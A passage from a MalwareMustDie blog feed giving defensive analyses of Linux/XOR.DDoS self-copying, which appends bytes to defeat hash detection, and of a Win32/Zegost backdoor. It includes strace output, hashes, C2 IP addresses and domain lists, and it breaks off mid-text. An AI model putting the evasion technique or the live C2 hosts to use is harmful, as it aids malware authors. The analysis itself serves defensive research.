on?\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003Eopen(\"\/tmp\/lgjgjmkkgd\", O_WRONLY); ; opening the copied file\u003Cbr \/\u003Elseek(3, 0, SEEK_END) = 625707 \u003C==size  ; set LSET to the EOF for writing\u003Cbr \/\u003E; SEEK_END = *)    ; note the size of original malware\u003Cbr \/\u003E\u003C\/pre\u003EIt looks like the pointer of \u003Ci\u003ELSET \u003C\/i\u003Eused to write is pointing to the end of the file itself, noted the \u003Ci\u003ESEEK_END\u003C\/i\u003E flag. For the illustration see the paste \"*)\" position below: \u003Cpre class=\"brush: asm\"\u003E## Illustration of the LSET set in the end of file..\u003Cbr \/\u003E\u003Cbr \/\u003E00098bd0  6d 65 00 5f 64 6c 5f 6d  61 70 5f 6f 62 6a 65 63  |me._dl_map_objec|\u003Cbr \/\u003E00098be0  74 5f 64 65 70 73 00 5f  6e 6c 5f 43 5f 4c 43 5f  |t_deps._nl_C_LC_|\u003Cbr \/\u003E00098bf0  49 44 45 4e 54 49 46 49  43 41 54 49 4f 4e 00 5f  |IDENTIFICATION._|\u003Cbr \/\u003E00098c00  64 6c 5f 6e 73 00 5f 6e  6c 5f 6c 6f 61 64 5f 6c  |dl_ns._nl_load_l|\u003Cbr \/\u003E00098c10  6f 63 61 6c 65 5f 66 72  6f 6d 5f 61 72 63 68 69  |ocale_from_archi|\u003Cbr \/\u003E00098c20  76 65 00 77 63 74 72 61  6e 73 00 *\u003C====          |ve.wctrans.*) \u003C==\u003Cbr \/\u003E00098c2b\u003Cbr \/\u003E\u003C\/pre\u003EAnd then we have these two operation called \u003Cb\u003Etimeoftheday()\u003C\/b\u003E and writing the specific strings in the end of the file: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Egettimeofday({1442479267, 397488}, NULL) ; for randomid() seed..\u003Cbr \/\u003Ewrite(3, \"wlpvpovdvi\\0\", 11) ; 'size is set to 11'\u003Cbr \/\u003E    ; write string \"wlpvpovdvi\\0\"-\u003Cbr \/\u003E    ; in the LSET position (EOF)\u003Cbr \/\u003E\u003C\/pre\u003ESo this is what happened for \u003Ci\u003EBEFORE\u003C\/i\u003E and \u003Ci\u003EAFTER \u003C\/i\u003Ethe writing:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8Bu75N0Od_E\/VfrNgcv_KpI\/AAAAAAAATOw\/HgrxMh_emds\/s3120\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8Bu75N0Od_E\/VfrNgcv_KpI\/AAAAAAAATOw\/HgrxMh_emds\/s580\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003ESo we see the file was added to 11 characters, which means we should have 11 bytes bigger for the size of file after this self-copy process, we'll get there..hang on!  \u003Cp\u003EFollowing \u003Ci\u003Ethe calls \u003C\/i\u003Eof the malware process, we can see the new file was saved: \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eclose(3)  ; end of writing process..\u003C\/pre\u003EAnd executed! Noted: \u003Cb\u003Eexecve() \u003C\/b\u003Efunction is used to spawn the \u003Ci\u003Eshell command\u003C\/i\u003E. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003Eexecve(\"\/tmp\/lgjgjmkkgd\", ..); ; main running process of XOR.DDOS in new PID\u003Cbr \/\u003E                               ; with new size (\u0026 hash)\u003Cbr \/\u003E\u003C\/pre\u003EYou can see how it was executed in the saved process data in the \u003Cb\u003E\/proc\u003C\/b\u003E :-), so believe me, it doesn't really any fancy tools for UNIX forensics, since UNIX gods already provided us openly with everything: \u003Cpre class=\"brush: asm\"\u003Elgjgjmkkg 14881 MMD  cwd   DIR  8,6     4096        7209106 \/TESTDIR\u003Cbr \/\u003Elgjgjmkkg 14881 MMD  rtd   DIR  8,1     4096              2 \/\u003Cbr \/\u003Elgjgjmkkg 14881 MMD  txt   REG  8,1   \"625718 \u003C== NEW SIZE\" 829 \/tmp\/lgjgjmkkgd\u003Cbr \/\u003Elgjgjmkkg 14881 MMD    0u  CHR  1,3      0t0           1028 \/dev\/null\u003Cbr \/\u003Elgjgjmkkg 14881 MMD    1u  CHR  1,3      0t0           1028 \/dev\/null\u003Cbr \/\u003Elgjgjmkkg 14881 MMD    2u  CHR  1,3      0t0           1028 \/dev\/null\u003Cbr \/\u003E\u003C\/pre\u003E..as per seen here it runs in new PID , not clone nor \u003Ci\u003Eforking\/threading\u003C\/i\u003E since execution used the shell spawning. See the new size, it gets bigger by 11 bytes.  \u003Cp\u003EBelow is the illustration of malware samples original and after copy-injected. \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E$ md5sum XOR.DDOS.SAMPLE lgjgjmkkgd\u003Cbr \/\u003E\"7642788b739c1ee1b6afeba9830959d3\"  XOR.DDOS.SAMPLE\u003Cbr \/\u003E\"df50d096fb52c66b17aacf69f074c1c3\"  lgjgjmkkgd\u003Cbr \/\u003E\u003Cbr \/\u003E$ ls -l XOR.DDOS.SAMPLE lgjgjmkkgd| awk '{print $5, $6, $7, $9}'\u003Cbr \/\u003E\"625718\" Sep 17 lgjgjmkkgd\u003Cbr \/\u003E\"625707\" Sep 17 XOR.DDOS.SAMPLE\u003Cbr \/\u003E\u003C\/pre\u003EWe have different hash and size.  \u003Cp\u003EOkay, we're done with the debugging and forensics. Let's see how the reverse engineering goes for this ELF malware binary for the above processes.  \u003Cp\u003EThis is the part where the \u003Cb\u003Emalware self-copy process was executed\u003C\/b\u003E in my sample case. Noted: there are so many cases to trail with the similar codes in copying, write files and randomizing them, I counted about more than 4 scenarios prepared for this operation and the author really calculate every possibilities in his code to make sure the malware will run. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ntt1kHDrZeY\/VfrNhCC4zvI\/AAAAAAAATO8\/R_trSbYdMks\/s3115\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ntt1kHDrZeY\/VfrNhCC4zvI\/AAAAAAAATO8\/R_trSbYdMks\/s580\/004.png\u003E\u003C\/a\u003E\u003Cbr\u003Ethe jump to \u003Cb\u003E0x804dfc2 \u003C\/b\u003Ewill take you to the next process.  \u003Cp\u003EThe assembly snip below is explaining the writing process to the done-copied file by the malware, it is not using the randomizing \u003Cb\u003E11 characters\u003C\/b\u003E but the malware was picking a hard coded \u003Ci\u003Exor crypt strings\u003C\/i\u003E that is saved in \u003Cb\u003E0x080cf120 \u003C\/b\u003E(symbol: \u003Ci\u003E\u003Cb\u003Estr.__Ff3VE._7\u003C\/b\u003E\u003C\/i\u003E).\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-QDNY17x2yb0\/VfrNhcNVBEI\/AAAAAAAATPI\/AtL7nFvJD2U\/s3120\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-QDNY17x2yb0\/VfrNhcNVBEI\/AAAAAAAATPI\/AtL7nFvJD2U\/s580\/006.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe \u003Cb\u003Esnprintf()\u003C\/b\u003E is an \u003Ci\u003EAPI function\u003C\/i\u003E that will lead (in the VERY end) to \u003Cb\u003ESYS_write\u003C\/b\u003E at sys\/syscall, since we deal with the statically compiled ELF many libc trails will appear in reversing the function, we may see more of these, sorry to say, unnecessary codes.  \u003Cp\u003EThe \u003Cb\u003Etimeoftheday()\u003C\/b\u003E result which was shown during debugging is caused by the function which was called, named function \u003Cb\u003Erandomid()\u003C\/b\u003E.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-PsZqFsOG8ug\/VfrNhIfIegI\/AAAAAAAATPA\/yIyLQZFMCms\/s3200\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-PsZqFsOG8ug\/VfrNhIfIegI\/AAAAAAAATPA\/yIyLQZFMCms\/s580\/005.png\u003E\u003C\/a\u003E\u003Cbr\u003E↑Obviously, is a self-explanatory that the \u003Cb\u003Etimeoftheday()\u003C\/b\u003E is fetching the system time as the seed needed in \u003Cb\u003Erandomid()\u003C\/b\u003E function.  \u003Cp\u003EThere is an additional information too actually: I think maybe it is good for our community to know too: \u003Cb\u003ELinux\/XOR.DDoS\u003C\/b\u003E ELF malware is using a uncommon seen function to execute the shell command, it was called: \u003Cb\u003ELinuxExec_Argv() and LinuxExec_Argv2()\u003C\/b\u003E, which was called to act as an API to execute non direct syscall basis commands by the malware (well, this is a static compiled binary), these functions are typical in characteristic, it is a very simple in use, easy to spot (smile) and these are responsible to call \u003Cb\u003Eexecve()\u003C\/b\u003E, a linux system call commands (with the environment parameter parsed) to be executed during an infection, and also to call \u003Cb\u003Eexecvp()\u003C\/b\u003E for the file execution purpose (with parsing the file path), i.e. shown in the code below: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-fo8topRbZvE\/VfrNhoXsDQI\/AAAAAAAATPM\/7nFt75Y-CIw\/s3120\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-fo8topRbZvE\/VfrNhoXsDQI\/AAAAAAAATPM\/7nFt75Y-CIw\/s580\/007.png\u003E\u003C\/a\u003E\u003Cbr\u003EYou may want to see the reference of exec method with \u003Ci\u003EUNIX C library\u003C\/i\u003E (\u003Ci\u003Elibc\u003C\/i\u003E) on execve, execvp at man(2) pages, and yes, UNIX gods are also providing us with good reference too.  \u003Cp\u003E\u003Ch2\u003EConclusion \u0026 reference\u003C\/h2\u003E \u003Cp\u003EYes, \u003Cb\u003ELinux\/XOR.DDoS\u003C\/b\u003E malware after copied and executed (read: successfully infecting us) will have a different size (11 bytes bigger..depends.. I only check one binary for this), and have a different hash. So this means that the malware spotted in the panel may not be detected by the scanner used inside of the Linux box if only detecting by the hash.  \u003Cp\u003EMany of us still think, \u003Ci\u003EYeah..ELF malware..won't harm us or end users much\u003C\/i\u003E.. But remember, IoT are mostly linux basis, take a look of the most of router's OS now. Also, the infection method and volume of ELF malware is getting better and bigger by days. As proof: We have about 6 of new ELF malware for 2 and half years span only! As MMD (read: \u003Ci\u003EMalwareMustDie, NPO\u003C\/i\u003E), we suggest to be prepared to update the ELF malware detection quality as earliest as possible, once an ELF malicious binary hit a server the impact can be way much bigger than a PE hit a PC.  \u003Cp\u003EBelow are links to the previous \u003Cb\u003ELinux\/XOR.DDoS\u003C\/b\u003E analysis:.\u003Cbr\u003E\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0037-2015-bad-shellshock.html\"\u003Ehttp:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0037-2015-bad-shellshock.html\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/09\/mmd-0028-2014-fuzzy-reversing-new-china.html\"\u003Ehttp:\/\/blog.malwaremustdie.org\/2014\/09\/mmd-0028-2014-fuzzy-reversing-new-china.html\u003C\/a\u003E \u003Cp\u003EThe \"new\" CNC of the threat: \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EWill \u003Ca href=\"https:\/\/twitter.com\/hashtag\/USA?src=hash\"\u003E#USA\u003C\/a\u003E be nice to clean:\u0026#10;192.126.126.64 \u0026amp; 107.160.40.9 \u0026lt; China crook\u0026#39;s \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CNC?src=hash\"\u003E#CNC\u003C\/a\u003E? \u0026#10;\u003Ca href=\"http:\/\/t.co\/fTD0V57ySc\"\u003Ehttp:\/\/t.co\/fTD0V57ySc\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/ZmabDO9aoP\"\u003Epic.twitter.com\/ZmabDO9aoP\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/643727555816615937\"\u003ESeptember 15, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EOh btw,the CNC is very alive even now...and sending the download\/payload too. here's the pcap snips for a hard proof:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-JqcoDx1jdmk\/VftNg3xvDbI\/AAAAAAAATQA\/JFqiQFCfmE4\/s3200\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-JqcoDx1jdmk\/VftNg3xvDbI\/AAAAAAAATQA\/JFqiQFCfmE4\/s580\/009.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-lS7HhmupfyE\/VfvbQn_UVHI\/AAAAAAAATQQ\/BvDuWE6NjSw\/s3120\/010.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-lS7HhmupfyE\/VfvbQn_UVHI\/AAAAAAAATQQ\/BvDuWE6NjSw\/s580\/010.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5SQICOfknM0\/Vfvb7ATJwnI\/AAAAAAAATQY\/jZjdBjHHj0s\/s3240\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5SQICOfknM0\/Vfvb7ATJwnI\/AAAAAAAATQY\/jZjdBjHHj0s\/s500\/011.png\u003E\u003C\/a\u003E \u003Cp\u003EKudos radare.org folks for convincing me to upgrade to git version from \/usr\/ports one:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-QXrozH80O_w\/VfrwgCJq2GI\/AAAAAAAATPw\/lr7MFbaxalA\/s3300\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-QXrozH80O_w\/VfrwgCJq2GI\/AAAAAAAATPw\/lr7MFbaxalA\/s550\/008.png\u003E\u003C\/a\u003E \u003Cp\u003EStay safe folks! Hope this short writing helps!  \u003Cp\u003E#MalwareMustDie"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/5381212088536202125\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/09\/mmd-0042-2015-polymorphic-in-elf.html#comment-form","title":"7 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5381212088536202125"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/5381212088536202125"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/09\/mmd-0042-2015-polymorphic-in-elf.html","title":"MMD-0043-2015 - Polymorphic in ELF malware: Linux\/Xor.DDOS"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-Dn4q7pJLnSo\/VfrNgfDM6QI\/AAAAAAAATO0\/8wKBziGadcE\/s72-c\/001.png","height":"72","width":"72"},"thr$total":{"$t":"7"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-8873961162950788058"},"published":{"$t":"2015-09-05T10:01:00.000-07:00"},"updated":{"$t":"2015-09-06T07:04:23.823-07:00"},"title":{"type":"text","$t":"MMD-0042-2015 - Hunting Mr. Black IDs via Zegost cracking"},"content":{"type":"html","$t":"This is a short writing,  Please bear the straight forward detail w\/very few of explanation. \u003Cbr\u003EDuring investigating \u003Ci\u003EELF malware \u003C\/i\u003EI met this Windows PE binary, it contains an important infrastructure information used by Mr. Black actor (the one who loves attacking our MIPS routers), so I decided to check and post a bit here.  \u003Cp\u003E\u003Ch2\u003EWin32\/Zegost.rfn [\u003Ca href=\"http:\/\/www.microsoft.com\/security\/portal\/threat\/encyclopedia\/entry.aspx?Name=Backdoor%3AWin32%2FZegost!rfn\u0026ThreatID=-2147275235\"\u003Elink\u003C\/a\u003E] (according to Microsoft)\u003C\/h2\u003E \u003Cp\u003EThe malware is sitting in the panel waiting to be distributed by the time I spotted:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-XPnBjja6GJg\/VesZv1t-U4I\/AAAAAAAATIM\/GEBzQuL5iOk\/s4300\/000.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-XPnBjja6GJg\/VesZv1t-U4I\/AAAAAAAATIM\/GEBzQuL5iOk\/s580\/000.png\u003E\u003C\/a\u003E \u003Cp\u003EThe actor who put the PE binary in the picture was attacking my \"router\" with the other ELF binary one, a MIPS architecture of \u003Cb\u003ELinux\/Mr.Black\u003C\/b\u003E, a family of \u003Ci\u003ELinux\/AES.DDoS\u003C\/i\u003E, a China ELF backdoor and DDoS'er variant, with the source IP of attacker and CNC lead to that panel's address.  \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/Mr.Black \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E:\u0026#10;1. Move2 S.Korea, \u003Ca href=\"https:\/\/twitter.com\/hashtag\/BLOCK?src=hash\"\u003E#BLOCK\u003C\/a\u003E: 210.92.18.118\u0026#10;2. ATTK graph attached\u0026#10;\u003Ca href=\"http:\/\/t.co\/juaN5YucV2\"\u003Ehttp:\/\/t.co\/juaN5YucV2\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/047s0xBrmU\"\u003Epic.twitter.com\/047s0xBrmU\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/639823232422428673\"\u003ESeptember 4, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003ESeeing the panel, knowing that the PE (exe file) malware wasn't being distributed yet by the actor, so I decided to grab, analyze and expose it first, and then I may consider it being \"even\" for their attacking effort to my \"router\" (noted the quotes).  \u003Cp\u003EThe PE is a \u003Cb\u003EWin32\/Zegost\u003C\/b\u003E variant, the dropper\/backdoor type, I uploaded it in VT here --\u003E [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/4a66d3f3b2c0d2e09f2399292bb8272d716f9e5a0db2963fb3dd0b4e6af53b41\/analysis\/1441465269\/\"\u003Elink\u003C\/a\u003E], It \u003Cb\u003Edrops\u003C\/b\u003E, \u003Cb\u003Eself deleted\u003C\/b\u003E, \u003Cb\u003Eauto-start\u003C\/b\u003E set in registry, \u003Cb\u003Estarting service\u003C\/b\u003E (also set in registry..as many of the other boring stuff, and the point of interest of I am writing here is \u003Cb\u003Econtacting mother hosts as backdoor\u003C\/b\u003E.Below are some reversing snips I did during ID-ing the threat..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-FpsMiVbgZ64\/VescjtLyu2I\/AAAAAAAATIw\/qzkPP9opW8s\/s3120\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-FpsMiVbgZ64\/VescjtLyu2I\/AAAAAAAATIw\/qzkPP9opW8s\/s580\/002.png\u003E\u003C\/a\u003E \u003Cbr\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-S3DcpgmhAjw\/VesZv8aaNaI\/AAAAAAAATIQ\/BXbrh-xSxLo\/s3220\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-S3DcpgmhAjw\/VesZv8aaNaI\/AAAAAAAATIQ\/BXbrh-xSxLo\/s580\/001.png\u003E\u003C\/a\u003E   \u003Cp\u003E\u003Ch2\u003EThe infrastructure\u003C\/h2\u003E \u003Cp\u003EThe PE has the \u003Ci\u003ECNC hostname permutated DGA\u003C\/i\u003E function and I managed to extract some of them: \u003Cpre class=\"brush: js\"\u003Econf.f.360.cn\u003Cbr \/\u003E'qi89.f3322.org'\u003Cbr \/\u003Equp.f.360.cn\u003Cbr \/\u003Eu.qurl.f.360.cn\u003Cbr \/\u003Equrl.f.360.cn\u003Cbr \/\u003Equrl.qh-lb.com\u003Cbr \/\u003Equp.qh-lb.com\u003Cbr \/\u003Esdupm.360.cn\u003Cbr \/\u003Esdup.360.cn\u003Cbr \/\u003Esdup.qh-lb.com\u003C\/pre\u003E \u003Ci\u003E\u003Cp\u003ENoted: The callback hostnames increased after we allow several CNC downloads. The malware DGA is generating many other fake domains.. For the botnet dissection, please focus is with the actual CNC established IP addresses only.\u003C\/i\u003E \u003Cp\u003EAnd each domains I checked as per snipped picture below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-4apJGd3pH20\/VesZvxGHgKI\/AAAAAAAATIU\/kEwhaH9p0CQ\/s3120\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-4apJGd3pH20\/VesZvxGHgKI\/AAAAAAAATIU\/kEwhaH9p0CQ\/s580\/003.png\u003E\u003C\/a\u003E \u003Cp\u003EI use the Kelihos fast flux milking script to milk IP addresses of the above domains: \u003Cpre class=\"brush: js\"\u003E$ cat domains.txt | bash flux.sh\u003Cbr \/\u003EKelihos FLUX check script by @unixfreaxjp\u003Cbr \/\u003ESun Sep  6 01:04:57 JST 2015\u003Cbr \/\u003E\u003Cbr \/\u003E\u003E\u003E\u003E conf.f.360.cn\u003Cbr \/\u003Equp.f.360.cn.\u003Cbr \/\u003Equp.qh-lb.com.\u003Cbr \/\u003E106.120.167.25\u003Cbr \/\u003E106.120.167.13\u003Cbr \/\u003Equp.f.360.cn.\u003Cbr \/\u003Equp.qh-lb.com.\u003Cbr \/\u003E106.120.167.15\u003Cbr \/\u003E106.120.167.10\u003Cbr \/\u003Equp.f.360.cn.\u003Cbr \/\u003Equp.qh-lb.com.\u003Cbr \/\u003E106.120.167.15\u003Cbr \/\u003E106.120.167.10\u003Cbr \/\u003E\u003Cbr \/\u003E\u003E\u003E\u003E qi89.f3322.org\u003Cbr \/\u003E210.92.18.118\u003Cbr \/\u003E210.92.18.118\u003Cbr \/\u003E210.92.18.118\u003Cbr \/\u003E\u003Cbr \/\u003E\u003E\u003E\u003E qup.f.360.cn\u003Cbr \/\u003Equp.qh-lb.com.\u003Cbr \/\u003E106.120.162.175\u003Cbr \/\u003E106.120.167.14\u003Cbr \/\u003Equp.qh-lb.com.\u003Cbr \/\u003E106.120.167.13\u003Cbr \/\u003E106.120.167.25\u003Cbr \/\u003Equp.qh-lb.com.\u003Cbr \/\u003E106.120.167.13\u003Cbr \/\u003E106.120.167.25\u003Cbr \/\u003E\u003Cbr \/\u003E\u003E\u003E\u003E u.qurl.f.360.cn\u003Cbr \/\u003Equrl.qh-lb.com.\u003Cbr \/\u003E106.38.187.100\u003Cbr \/\u003E106.38.187.103\u003Cbr \/\u003Equrl.qh-lb.com.\u003Cbr \/\u003E106.120.167.100\u003Cbr \/\u003E106.38.187.106\u003Cbr \/\u003Equrl.qh-lb.com.\u003Cbr \/\u003E106.120.167.102\u003Cbr \/\u003E106.38.187.113\u003Cbr \/\u003E\u003Cbr \/\u003E\u003E\u003E\u003E qurl.f.360.cn\u003Cbr \/\u003Equrl.qh-lb.com.\u003Cbr \/\u003E106.38.187.105\u003Cbr \/\u003E106.38.187.113\u003Cbr \/\u003Equrl.qh-lb.com.\u003Cbr \/\u003E106.38.187.105\u003Cbr \/\u003E106.38.187.113\u003Cbr \/\u003Equrl.qh-lb.com.\u003Cbr \/\u003E106.38.187.118\u003Cbr \/\u003E101.199.109.151\u003Cbr \/\u003E\u003Cbr \/\u003E\u003E\u003E\u003E qurl.qh-lb.com\u003Cbr \/\u003E106.38.187.103\u003Cbr \/\u003E106.38.187.106\u003Cbr \/\u003E106.38.187.100\u003Cbr \/\u003E106.38.187.103\u003Cbr \/\u003E106.38.187.103\u003Cbr \/\u003E106.38.187.100\u003Cbr \/\u003E\u003Cbr \/\u003E\u003E\u003E\u003E qup.qh-lb.com\u003Cbr \/\u003E106.120.162.174\u003Cbr \/\u003E106.120.167.10\u003Cbr \/\u003E106.120.162.174\u003Cbr \/\u003E106.120.167.10\u003Cbr \/\u003E106.120.162.178\u003Cbr \/\u003E106.120.162.175\u003Cbr \/\u003E[...]\u003C\/pre\u003E \u003Cp\u003EThe result of the IP milking is some of static legit IDC IP addresses in Beijing, China :-) as per listed below... At the first sight I thought these are CNC, but later on I found it very weird :-) \u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E106.120.167.15|15.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.8|8.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.162.176|176.162.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.14|14.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.38.187.101||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.38.187.102||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.38.187.103||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.38.187.104||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.38.187.105||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.9|9.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.14|14.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.162.174|174.162.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.38.187.115||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.38.187.116||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E101.199.109.144||23724 | 101.199.108.0\/22 | CHINANET-IDC-BJ | CN | 360.cn | Beijing Qihu Technology Company Limited\u003Cbr \/\u003E106.38.187.102||23724 | 106.38.176.0\/20 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.29|29.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.162.178|178.162.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.92|92.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.90|90.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E106.120.167.86|86.167.120.106.static.bjtelecom.net.|23724 | 106.120.160.0\/19 | CHINANET-IDC-BJ | CN | chinatelecom.com.cn | ChinaNet Beijing Province Network\u003Cbr \/\u003E[...]\u003C\/pre\u003EI investigated to find the IP addresses listed above IDC are belong to \u003Cb\u003E360.cn\u003C\/b\u003E, a legit service in PRC\/China.  \u003Cp\u003EBut there's \u003Cb\u003E\u003Ci\u003Eonly one IP address\u003C\/i\u003E\u003C\/b\u003E that shows different network, this leads us into a \u003Ci\u003Emalicious utilized host in South Korea\u003C\/i\u003E, and this is the malware panel's IP address itself.. \u003Cpre class=\"brush: asm\"\u003E210.92.18.118||4766 | 210.92.0.0\/18 | KIXS-AS | KR | dshw.co.kr | Sudokwonseobubonbu\u003C\/pre\u003EThe GeoIP confirmed: \u003Cpre 